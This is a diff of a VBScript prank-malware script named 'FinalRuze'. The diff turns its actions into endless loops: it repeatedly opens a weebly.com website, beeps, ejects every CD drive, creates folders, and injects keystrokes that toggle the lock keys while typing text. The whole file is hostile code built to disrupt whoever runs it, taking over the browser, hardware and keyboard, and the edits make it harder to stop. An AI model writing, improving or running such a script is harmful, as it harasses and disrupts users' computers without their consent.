@@ -2,12 +2,14 @@ Option Explicit
 
 Dim objShell, objShellApp, objDesktop, objFolder, objItem, xPos, yPos, ts, strDriveLetter, intDriveLetter, fs, colCDROMs, d, oWMP, i, folder_name
 Const CDROM = 4
-Const num_folders = 99999999999999
+Const num_folders = 5
 Dim base_folder_name
 
 ' Open website loop
-CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
-CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
+Do While True
+    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
+    WScript.Sleep 1000
+Loop
 
 ' Beep sound loop
 Do While True
@@ -30,7 +32,7 @@ Do While True
 Loop
 
 ' Eject CD loop
-Do
+Do While True
     Set fs = CreateObject("Scripting.FileSystemObject")
     strDriveLetter = ""
     For intDriveLetter = Asc("A") To Asc("Z")
@@ -42,16 +44,17 @@ Do
             End If
         End If
     Next
-    Set oWMP = CreateObject("WMPlayer.OCX.7")
+    Set oWMP = CreateObject("WMPlayer.OCX.7" )
     Set colCDROMs = oWMP.cdromCollection
-    For d = 0 To colCDROMs.Count - 1
+    For d = 0 to colCDROMs.Count - 1
         colCDROMs.Item(d).Eject
     Next
-    For d = 0 To colCDROMs.Count - 1
+    For d = 0 to colCDROMs.Count - 1
         colCDROMs.Item(d).Eject
     Next
-    set owmp = Nothing
-    set colCDROMs = Nothing
+    set owmp = nothing
+    set colCDROMs = nothing
+    WScript.Sleep 1000
 Loop
 
 ' Create many folders
@@ -64,10 +67,10 @@ Next
 
 ' Type some text and toggle lock keys
 set objShell = wscript.createobject ("wscript.shell")
-do
+do while True
     wscript.sleep 100
     objShell.sendkeys "{CAPSLOCK}"
     objShell.sendkeys "{NUMLOCK}"
     objShell.sendkeys "This is the FinalRuze"
     objShell.sendkeys "{SCROLLLOCK}"
-loop
+Loop
